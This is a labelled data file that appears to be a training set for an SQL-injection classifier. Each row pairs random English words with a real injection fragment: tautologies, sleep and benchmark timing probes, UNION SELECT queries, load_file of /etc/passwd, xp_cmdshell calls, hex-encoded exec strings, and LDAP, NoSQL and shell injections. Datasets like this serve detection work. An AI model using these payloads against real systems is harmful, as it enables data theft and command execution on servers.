payload	sqli
nonintellectualness hunger-starve gonophorous Ellwood 0	1
Castalia NASCAR 21 % ortho-toluidine ill-dressed horse-laugh	1
viduate limit unscalable nonscrutinies obsoletism	1
or 1=1 Hanuman gasify self-focussing	1
or 2 > 1 nonsancties honey-stalks tautogs customly	1
")) or benchmark(10000000,MD5(1))# contrecoup dimorph Bugbee brass-fronted Turko-italian tergant	1
Alibamu seditionist swim-bladder PRINT Forkunion vastities	1
hauled long-visaged microcytosis strobil oximation hi') or ('a'='a	1
or 3=3 sparkling sufflated microelement gressorious	1
THREE rustically ));waitfor delay '0:0:__TIME__'--	1
slipperweed missupposing pretarsus Holey a' waitfor delay '0:0:10'--	1
emeses dodoism Chi-Rhos 1;(load_file(char(47,101,116,99,47,112,97,115, ... nonconfrontation Klaskino	1
or%201=1 hackneys urushiol acutilobate Euryale amoebic	1
sugarelly Theodotian slipperwort 1 or sleep(__TIME__)#	1
whistlewood reformers or 1=1 stuffer	1
bankrupting Caripuna  and 1 in (select var from temp)--	1
or '7659'='7659 high-spiritedness unimprovedness marrows	1
Ayuthia  or 'text' = n'text' plerosis Ginnie	1
love-madness smittlish solitudinizing  -- LaRue	1
rake-off pinulus nonabortively  or 1=1 or ''='	1
castigates inguinocrural Delmore confuted declare @s varchar (200) select @s = 0x73656c6 ...	1
lacquered echea Inachus exec xp calelectric carrot-top improv	1
desand smoodged ; exec master..xp_cmdshell 'ping 172.10.1.255'-- ballot ethered	1
undelightfully losings 3.10E+17	1
poldron burliest elengeness baldric " or pg_sleep(__TIME__)-- nonsubjectification Etherege	1
unbarricadoed tarso-metatarsal gestant histing x' AND email IS NULL; -- hedron	1
quirkier pre-Celtic well-studied minnies & rookish	1
thick-topped admin' or ' rehone	1
mohurs cold-bloodedly  or 'unusual' = 'unusual' speckle	1
// nondirectional guglets plumpers lamenting denominant	1
weary-laden wamuses truncate	1
upgirded Procoelia 1) or benchmark(10000000,MD5(1))#	1
open-reel reintercede atmosteon \x27UNION SELECT pilule Nashwauk	1
pignorated musted little-minded declare @s varchar(200) select @s = 0x77616974 ... behaviourally	1
upswallow restrains kawakawa iteming tz_offset pseudomilitaristic backstab	1
Berkey loss's sqlvuln onomatopoesy	1
"));waitfor delay '0:0:__TIME__'-- apepsinia crystal's Penni	1
||6 one-sided scarpetti	1
moonack Alcyoniaceae morpholin or%201=1 -- nonexuberance toad-in-the-hole hajjes	1
equipotential %2A%28%7C%28objectclass%3D%2A%29%29 world-abiding candock	1
Quillaja or a=a Magyarizing	1
teamman Hadamard ) union select * from information_schema.tables; feff Shillong	1
PRINT @@variable doodad noncustomarily	1
field-stript titfish xylylene torrent-flooded or isNULL(1/0) /*	1
26 % otopyosis Abernon nonconfining flowerpot	1
" or "a"="a combatable pleometrotic alga pressirostral	1
bye-water Muller Meliad (sqlvuln) P-state	1
dobermans megascopic x' AND members.email IS NULL; -- nonconstructively roofage Anatum bounteously	1
alcelaphine provoking  or 1=1-- dapsone Ellett	1
uvulitises  and 1=( if((load_file(char(110,46,101,120,11 ... derided visualizes	1
0x770061006900740066006F0072002000640065006C00 ... prognosed plain-darn NA	1
%20'sleep%2050' conscious usuals burying-ground matins untrodden	1
scorchs caretakes suprasternal as boyau	1
1)) or pg_sleep(__TIME__)-- Cavalerius Melnick wanton-winged Coptis	1
pitmirk microtitration /**/or/**/1/**/=/**/1	1
prefestival  union all select @@version-- excogitated undemolishable unsneck norie	1
Shawn panties ,@variable perispome pride-swollen paucidentate brittle-star	1
(sqlattempt2) buckshot LN2 heterochronistic raped	1
leechcraft spine-chiller deadpanned  or (EXISTS)	1
t'exec master..xp_cmdshell 'nslookup www.googl ... crossopodia nonpalatal Gassendi dismay	1
%20$(sleep%2050) yelps Freud ungradating	1
trim-cut 1 or benchmark(10000000,MD5(1))# bluntly adminicular	1
guttering genyantrum %20or%20''=' dandyprat	1
phagocytic nonexterminative Luci ||UTL_HTTP.REQUEST	1
Marcellette niggarding platooned undernurse cloven-footedness  or pg_sleep(__TIME__)-- nuncupated	1
Touchet hi' or 'x'='x'; oophorectomy	1
") or sleep(__TIME__)=" PIF axometric	1
Devanagari henen  or 'whatever' in ('whatever') stasidia subdivides mariachis ram-jam	1
sick-list benzoyls ; begin declare @var varchar(8000) set @var=' ... orgia misimpute diacid nasturtium	1
union select 1,load_file('/etc/passwd'),1,1,1; pillorization indigestibly canards asyndetons	1
0x77616974666F722064656C61792027303A303A313027 ... whoop-de-doo subjectivo-	1
bridelike exec(@s) sarcomatoid bloodlessly Addison	1
ocean-smelling ) or pg_sleep(__TIME__)-- spoilate unremorsefulness centraxonial	1
wallaroo nondensity God-sent moistens watchglassful reindeers  union select	1
proletarizing  or sleep(__TIME__)# Zanzibari serflike affableness ensnarl	1
Sad time-scarred superposes Cryptocerata  select * from information_schema.tables-- Esdras	1
historicodogmatic prolin nonattainability vermiculosity gds. a' or 1=1--	1
sulphation topiary a' or 'a' = 'a	1
quasi-sincerely declare @s varchar(22) select @s = Servetnick	1
depetalize nonprofessional pseudomorphosis  or 2 between 1 and 3	1
or a=a-- Cheilodipteridae self-opiniativeness Ostraciidae built-up	1
HT  or '1'='1 Leta yenite inoculative baggily	1
hypopodium apolitically pentachromic lording |	1
OMM  or sleep(__TIME__)=' deray	1
or 1 --' trapanning Hebe McVille	1
multimillionaire dechristianize wild-woven or 0=0 #" buccula	1
milk-condensing logarithmetically overhold IATSE having towability twice-acquired	1
Prinz re-repair a' Highams gallybagger preconstituent martingale	1
" or isNULL(1/0) /* humanities jaggeder Fleta non-tenure colonelcy eighty-eighth	1
unmanner abietate slatified vertigos declare @s varchar (8000) select @s = 0x73656c ... coddles	1
â or 1=1 -- orchidomania penicillia	1
char%4039%41%2b%40SELECT uncurl caneva Tro centimeter penality co-mate	1
Seuss order by pooli procreate Macanese ventricular ectosteal	1
plumpest bfilename acumen	1
having 1=1-- sakulya infraprotein Tuskahoma walkups hemihydrate	1
) or benchmark(10000000,MD5(1))# nominalness trionfo sadheartedness retroinfection pulu agregation	1
sleep-provoker standings  or username like char(37); Marathi Nuculidae	1
myrmecobine nectocalyx rheologist reviewer ;waitfor delay '0:0:__TIME__'-- Aroides	1
thinnesses " or 1=1-- unalike manslaughterous	1
leucocyan dealbate x' AND userid IS NULL; --	1
twice-arbitrated foreappoint grows */* morion nonsignatories Cycadaceae	1
pelvigraphy strait-waistcoat heart-hungry couturiers dispossed adipopexia  or 'text' > 't'	1
peripetasma JCET  (select top 1 remonetise befretted	1
or benchmark(10000000,MD5(1))# Ben-oni countershafting	1
near-colored boilable Buckels ");waitfor delay '0:0:__TIME__'-- pectoriloquism	1
beshames Vieva a' or 3=3--	1
-- &password= cheeping flat-shouldered acclaims	1
lobation resenting flooding  group by userid having 1=1-- cozily coulure	1
Protobasidiomycetes  or ''=' twice-hidden	1
separability biliment ; exec master..xp_cmdshell unworthinesses	1
strips %20or%20x=x Siphoneae phenicious tautometric	1
fulvescent Gayel immobilization select cozie unadvised	1
Lauderdale Orpah Ineslta ")) or sleep(__TIME__)=" stepdaughters trouserless	1
plaintiff grapeys 0x730065006c0065006300740020004000400076006500 ... treaders	1
ladder-backed Acmaeidae hi' or 1=1 -- monomaniac	1
") or pg_sleep(__TIME__)-- NORAD Cavia climaxed chickenheartedness eruditical fur-coated	1
pyophagia %20or%20'x'='x string's	1
or 'something' = 'some'+'thing' despondentness nonscrutiny burnishing	1
houseman exec sp ulcerates stage-bleed all-puissant monopodia	1
toughy 29 % CNM Xanthinthique	1
( technician's Devinna redipping	1
monographic Ã½ or 1=1 -- incitive	1
Alf ungraveled unforeseeingly 1 or pg_sleep(__TIME__)--	1
toxinaemia microfossil sarangi Marijn 0 or 1=1 luxuriated Holloman	1
larithmics ash-throated uncrystalled falcons peripneumonic ) or (a=a smoke-pennoned	1
preblesses underalderman chollas uni/**/on sel/**/ect	1
trounces Cockaigne aff invertebrates gardenable polishing replace	1
traveltime %27%20or%201=1 tenterhooks skinks thunder-voiced guaiaconic	1
baccheion moon-blasting Chadd Rena )) or pg_sleep(__TIME__)-- salutary	1
Natalbany %7C motioner asbestos-packed sparkle Dermochelys	1
horoscope x' AND 1=(SELECT COUNT(*) FROM tabname); -- satraps	1
steeplechaser idiometer director's &apos;%20OR	1
aradid ; or '1'='1' Lulita choregraphic eulogising over-read participantly	1
quasi-safe declare @q nvarchar (200) select @q = 0x770061 ... quandongs flitfold Malebranchism polyspermal	1
1 or 1=1 Mikes Ixora caesurae	1
creaker ; exec ('sel' + 'ect us' + 'er') misresolved radiolucence pyrexias	1
hirsles double-cupped 23 OR 1=1 consy eavesdropper	1
/ lucrum epicormic	1
titleproof bargain-basement tropicalise anything' OR 'x'='x trophectoderm	1
declare @q nvarchar (4000) select @q = pseudopodal controllable	1
giblets slabstone or 0=0 --	1
stick-ride lackey narendra basichromiole desc Silenus	1
methomania Bink unsoulful ||'6 crustose	1
) entangled tetrachlorides BA	1
bothria Ofilia 1)) or sleep(__TIME__)# weer amicrobic overornamentation	1
formatters Arminianizer or 0=0 # vinal decarbonylate kanthan ground-squirrel	1
Elburr viripotent  select name from syscolumns where id = (sele ... Fragilaria	1
Anthropozoic laundrywoman Padraic demicannon rewriter stearone hi or a=a	1
watercaster she-baker parrots undefined flether *(|(mail=*))	1
abortional contemningly password:*/=1--	1
timo overbraced distinct jargoned	1
Petronille );waitfor delay '0:0:__TIME__'-- Haddix sourcake all-flotation	1
bifolia pythonism to_timestamp_tz Cummington hormion worded	1
") or benchmark(10000000,MD5(1))# Ruppertsberger dolorimetry	1
Hebr justicies specus siphonozooid  UNION SELECT psychophysiologist	1
escapers metamorphosy %2A%28%7C%28mail%3D%2A%29%29 Eurypelma	1
quasi-consequential chudders subsales +sqlvuln multimegaton	1
linear-acute superconducting  or 1=1 /* unlocalizable square-headed field-book	1
Chino-japanese lumpman synechthry canula )) or sleep(__TIME__)=' pulled	1
or 1=1 or ""= premarriage smockings	1
schematomancy closure  or 1 in (select @@version)-- runround hydroplaning Molossus let	1
malaclypse God-cursed sqlvuln; spheroidism despotic	1
fashional outgive autocinesis  union select * from users where login = char ... unseaworthiness negation	1
slugging x' or 1=1 or 'x'='y Castella Cosmotron	1
hebdomader gaub 28 % padesoy quilled impedor	1
Praxitelean â or 3=3 -- Northern hin infallibilist sneers	1
beknight absinthian tamelessness parriable @variable grayest vallisneriaceous	1
coal-scuttle  or '1'='1'-- aphototropic gnathobasic Arianize comediennes	1
"a"" or 1=1--" Corcyraean retested fuddles	1
ekamanganese co-starred daddocky unweighability //*	1
%2A%7C extinguishing anisogametic indoctrinization Anti	1
banakite Megaceros " or 0=0 -- wrathfully	1
recounseled ")) or pg_sleep(__TIME__)-- metasomatism emasculations sync-generator Morten	1
buchonite tarnishment Brandon siphon undoubtedness ? Chicanos	1
sterned  or 1/* sly-goose biblio- gyroscope	1
downdraught testes ! vantage marplotry	1
' NRL Filix gonesome manured	1
neighboring  or a = a uncensorious elve	1
hematogenic promemorial greasily Zeuglodontidae declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)	1
birdhouses declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) stinkbird	1
nonobservable declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) paraformaldehyde reinducement snick-a-snee foreanswer	1
missent declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) barratries lumberyard	1
pre-ignition ' or 1=1 dephlogisticate	1
 or 1=1 -- unfinalized scumbled modelings	1
turboblower opiniatively x' OR full_name LIKE '%Bob%	1
backbrand atmospherically anterevolutionary '; exec master..xp_cmdshell 'ping 172.10.1.255'-- exalted Bugas medula	1
'%20or%20''=' irreversibleness exoticist pancreatization hokerer Epiphany	1
court-customary '%20or%20'x'='x whitish Megachiroptera thinnish thickwind	1
')%20or%20('x'='x coeval periastron oceanous matelote fireflaught covariate	1
hepatography palaeophytology ' or 0=0 -- consubstantiationist farness screendom	1
Trappism airliner tautomeral ' or 0=0 # knuclesome pathoneurosis	1
castles phototopography  or 0=0 #"	1
frumentum apishamore ' or 1=1--	1
' or '1'='1'-- Nerites pastiest triradiation deaerating Quartodeciman jack-in-the-green	1
sensillum shrive ' or 1 --' wited Edveh	1
or 1=1-- coassists hodge-podge Anasitch wardsmaid	1
pedanticly unquailed ' or 1=1 or ''=' preexpounder matriculable Pygobranchiata transcendant	1
malleal salinoterreous bug-word thereon  or 1=1 or ""= codiscoverers subabilities	1
eviting ' or a=a-- defyingly bedless gressorial	1
or a=a duodiode-triode paraplasmic	1
') or ('a'='a spiritless self-interrupting storiated	1
adscendent 'hi' or 'x'='x'; archispore abluted	1
slime-begotten toad-in-the-hole or adspiration hygeology sal-prunella slim-spired	1
procedure dreamlessness costers	1
illness's down-talk electrosynthetic Dowski handler	1
asseverating ' or username like '% besleeve	1
procure ' or uname like '% tonnage amorally	1
truism ' or userid like '% randn	1
pelvisternum ' or uid like '% reverses	1
Aramen Redd PPI ' or user like '%	1
sotweed distinctions Howland undreading '; exec master..xp_cmdshell Vedalia	1
furcates internationalizing Albric Lexis '; exec xp_regread	1
meconophagism t'exec master..xp_cmdshell 'nslookup www.google.com'-- houselling Emmaus doted sturdy-limbed	1
upraisers dysanagnosia --sp_password impecuniousness	1
otocystic prop-wash latomia ' UNION SELECT betel	1
uncessantly paleovolcanic ' UNION ALL SELECT toddling	1
' or (EXISTS) Ulidian Formicoidea savoringly anergias	1
oligotrichia nonreplicate Arauna pettitoes ' (select top 1 silverspot	1
'||UTL_HTTP.REQUEST tasse cowdie Pappea Creek	1
1;SELECT%20* speedfully futureless	1
Cumings first-told paperweights <>"'%;)(&+ slitshell Foster	1
babesias new-bloomed nonhedonistic '%20or%201=1	1
jitney predistributor 'sqlattempt1	1
unstylishly %28 apothegm ivyflower	1
resided oculo- %29	1
versemaking %26 hazily extra-foraneous	1
%21 extendible TOY miscomplain rfree astrict bagh	1
wimble ' or ''=' kemelin Hippeastrum semidictatorialness	1
holist preaccommodate unduplicity ' or 3=3 woodskin	1
Holley meditatedly antigenicity  or 3=3 --	1
Advaita abandum cofactors ferities  -- tallow-lighted	1
leptochroa ! unromanticised	1
! fatuoid cayos detracted philol	1
singultation BL y-warn freck warmhouse submariners "	1
# latitant monostrophic onomomancy PhD noncertified	1
& Pro-britishism Jonesville isauxetic unguards	1
empurpled tacklings umbrate Amalfian & phenomenalization nuchae	1
fricando Powhatan padded enterorrhaphy ' scansory	1
synaxaries ' Tashkent chaplanry Bytom satinay	1
pseudolinguistically damaskeening ' --	1
Valdez lallygagging '); -- forwoden	1
'; -- Rodd nutating chinch	1
corpses bloody-mindedness oxeate '\" metal-bending snailed	1
( muriated trebled	1
washbowls Ladd ( cryptogenetic	1
impower hypnoanalyses jubilees ) upcarry trithing	1
literated finestill ) iron-bark PHOTOCD Viperina	1
playwrighting */* hypophonia unexorableness	1
Camelus Limosi flexagon tiang */* Kaffir	1
Callida extremists bellbinder forride unepigrammatically *| capstan	1
*| poiser boxthorns	1
Sharyn sin-absolving beacons reediness -	1
battleship coediting -- perfunctionary	1
mushiest --'; satirises unindentable	1
cytolymph Thayer /	1
Megachiroptera Simosaurus / ariegite melodramatising bass-relief curlier	1
vivant unsetting consecute sailfish // pelviform launch	1
indentations fibrinocellular underarch // overservice cacodaemon Geulincx	1
tomcatting theretoward Epidendrum //* fractonimbus borocitrate	1
jarringly //* devertebrated presocial incitable	1
Domenikos Bagheli ; --	1
Gonzlez Orthocarpus <>"'%;)(&+ angiorrhexis perichordal previolation	1
dubitation Procyoniformia <>"'%;)(&+ Crassulaceae handworks annihilate	1
spoach endocrinologist dipping ? mystico-allegoric	1
newtonite dejeuner postneurotic |	1
cogitates unexhilarating forevermore Carmanor | time-lapse	1
Drusedom ' } ], $comment:'successful MongoDB injection' tavs thematic jambeau casthouse overjealousness	1
ninnyhammer Pantastomatida Guillen Odysseus interstriven {$gt: ''} pollable	1
Rhynchota [$ne]=1 oenologist sugescent specific-gravity overproportion	1
{ $ne: 1 } homopolymerize scious firry Alceste	1
', $or: [ {}, { 'a':'a Rattray acromyodous Alosa	1
sendal ', $where: '1 == 1' helpingly ventripotent covido pursuable crawtae	1
sulphobenzoic , $where: '1 == 1' gurgulio	1
folklores Bettinus $where: '1 == 1' pungency	1
Sherrill 0 juncat Rudwik	1
unknownly disci 031003000270000	1
heptametrical Cordy 0 or 1=1 relievedly skimble-scamble	1
programmatically czarevnas uncathedraled 0 or 1=1	1
uretero-uterine rhaebosis 0x730065006c0065006300740020004000400076006500 ... baldpates	1
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) alkalinized adenectomy	1
favouredly unbeseemly 0x770061006900740066006F0072002000640065006C00 ... disadvantageousness	1
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A wretchock parrot-red	1
tetrol pro-Malayan sheepman scandals Warfold 0x77616974666F722064656C61792027303A303A313027 ... transactional	1
0x77616974666F722064656C61792027303A303A31302700 exec(@s) Elkwood nebulized	1
overhauler pyrometamorphism 1, $where: '1 == 1' departmentalising	1
tutorially unmockingly || 1==1 nonwaxing	1
berakah hyperpolysyllabic arrestees Watsonia bin-burn well-directed 1'1	1
sun-brown 1\'1 unmincing peacefully	1
shame-eaten 1 and 1=1 piedroit	1
genecor causae techniquer 1' and 1=(select count(*) from tablenames); -- forfaulture pachydermia parasuchian	1
unfloured noncollapsibility 1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116 marcasitic prologues next-door	1
Alloway scabiophobia rhabdosophy 1' and non_existant_table = '1	1
riboflavins circumnavigatory 1 and user_name() = 'dbo' table-formed boccaro strigae half-dark	1
preceptive uneagerly windy-headed 1 exec sp_ (or exec xp_) self-corresponding counterpanes diagenesis	1
hootay guru unfairness luckier 1;(load_file(char(47,101,116,99,47,112,97,115, ... rtw hypocotyledonary	1
clot-bird Alurta centrifugally self-kindled duarchies 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;	1
chapbooks 1 or 1=1 inconsequentia	1
brombenzyl Eloise 1'or'1'='1	1
unpraised undiplomatic dassent aerohydrotherapy 1' or '1'='1	1
mazourkas shipowner 1or1=1 Rashti	1
1 or benchmark(10000000,MD5(1))# preconsent gammerel Nasiei	1
administration's plainclothesmen 1) or benchmark(10000000,MD5(1))#	1
1)) or benchmark(10000000,MD5(1))# displeasedly levitation	1
gladiatory 1 or pg_sleep(5)-- hemipeptone	1
dysodile hydrogymnastics subtilest 1) or pg_sleep(5)--	1
ayahausca woodreeve 1)) or pg_sleep(5)-- angolar mischristen libr	1
NPA guerrila plurimammate anther 1 or pg_sleep(__TIME__)-- jutted nibung	1
1) or pg_sleep(__TIME__)-- atavi arts-master	1
timbral 1)) or pg_sleep(__TIME__)-- amylenol popular-priced	1
precrucial Earlysville alfaquins pyodermas Timmons 1 or sleep(5)#	1
epistolize Panthia 1) or sleep(5)# confessingly	1
sweepboard treblet infolders Balmoral 1)) or sleep(5)# SOMM outraves	1
elytr- microcopying perpet 1 or sleep(__TIME__)# nonbetrayal Hideyo	1
animalculous stablekeeper Monopneumoa Naseby 1) or sleep(__TIME__)# ribbonfishes shade	1
forespent calathisci Damysus baddishness fevertwig 1)) or sleep(__TIME__)# cytosin	1
1;SELECT%20* Herrick Aleppo twice-occasioned regrettingly tolerably tuberculosis	1
leptostracan foh esthesiophysiology 1;SELECT%20* nymphomaniac	1
cup-moss tanyards 1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --	1
Whitechapel farm-yard Swansea ERD 1 uni/**/on select all from where hypocholesterinemia	1
brainish imperceivable summerier 1 waitfor delay '0:0:10'-- Stanardsville unbeclouded Provenal	1
rose-colorist '%20-- formant	1
cubans high-rise '%20;	1
comessation fitnesses =%20' homodont	1
uniparient tabulated nigged posttension =%20--	1
disinsulation =%20; exhusband tragedies	1
%20$(sleep%2050) meou embryonated	1
knownothingism %20$(sleep%2050) unsatiableness leggy Pacoima claw-footed motorboater	1
contravariant Rockham '%20%26%26%20this.password.match(/.*/)//+%00	1
'%20%26%26%20this.passwordzz.match(/.*/)//+%00 peristomal sulfoselenide	1
fillies %20or%20''=' postventral chanceably blue-washed laurelled twice-bestowed	1
deltal nonspecific '%20or%20''='	1
prytanize dehydrogeniser trollman '%20or%20''=' Phonevision mailbags	1
%20or%201=1 deadeyes Drambuie	1
whetile Letti '%20or%201=1 angiotonase	1
mutant hidling galegine Vendean '%20or%201=1	1
"%20or%20"x"="x garden-variety unsmirkingly	1
cueist functionarism barangay %20or%20'x'='x qualm-sick	1
sloshily brachiocrural %20or%20x=x barbican explicating	1
Lemuel thraver '%20or%20'x'='x	1
Chocoan unaimed '%20or%20'x'='x nightmarish dynamiter software's quasi-humanly	1
supercandidly stayers nonmercearies ')%20or%20('x'='x Agrionidae vegetate	1
nonfamilies pin-brained ')%20or%20('x'='x ughten	1
contradiction's )%20or%20('x'='x perborax case-worm Mallen	1
luged postphthistic palaeozoological %20'sleep%2050'	1
hesitant vixenishly spalpeens obeliac A-line %20'sleep%2050'	1
hydrophily %21 sols	1
barcelonas %21 Baikonur habitualnesses trepidations	1
spats newspaperwoman staglike livestock 21%	1
Guat. evolutionally unpromotive 23 OR 1=1	1
Svetlana %26 Bernat	1
%26 poutingly perididymis	1
cyme parcellary ursuk 26 % abomination	1
26% antipreparedness English underplot	1
Trento %27%20or%201=1 chiff-chaff common-room nonoffender	1
%27%20or%201=1 preutilize cuboids	1
profited %28 nonspeaking masterhood larruped Chugwater	1
makuta Clynes salutatious %28 muciferous bez-antler	1
tithymal armorial unhauled 28% guldens nor-	1
crossrail langbanite dogmatiser nonilluminant %29 empire-builder snails	1
pyridinize tinsellike tribulation MASH %29 macropodia	1
evans-root inaja 29 % nonconformitant myrmecophile equidist	1
Kingdon falsenesses 29% affine repudiatory	1
tupelos %2A%28%7C%28mail%3D%2A%29%29 caliology solid-ink	1
baby's-breath %2A%28%7C%28mail%3D%2A%29%29 Gylden convival retailer wenniest supportability	1
batholitic spongioplasm %2A%28%7C%28objectclass%3D%2A%29%29	1
thirsted relending sleepify tropist flashtubes %2A%28%7C%28objectclass%3D%2A%29%29 celiogastrotomy	1
Minnehaha incompressibility %2A%7C	1
conversationist %2A%7C benzocoumaran imprevu	1
3.10E+17 Curzon drolushness unhalved carelessly cruised	1
